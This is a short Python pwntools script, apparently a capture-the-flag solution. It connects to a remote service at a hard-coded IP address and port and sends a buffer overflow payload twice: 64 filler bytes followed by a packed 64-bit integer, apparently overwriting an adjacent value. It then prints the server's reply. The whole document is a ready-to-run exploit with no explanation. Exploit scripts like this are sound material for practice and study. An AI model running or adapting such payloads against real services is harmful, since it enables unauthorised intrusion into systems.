from pwn import *

p = remote('35.207.132.47', 22223)

payload = "A"*64 + p64(1000000)

p.recv()
p.sendline(payload)
p.recv()
p.sendline(payload)
print p.recv()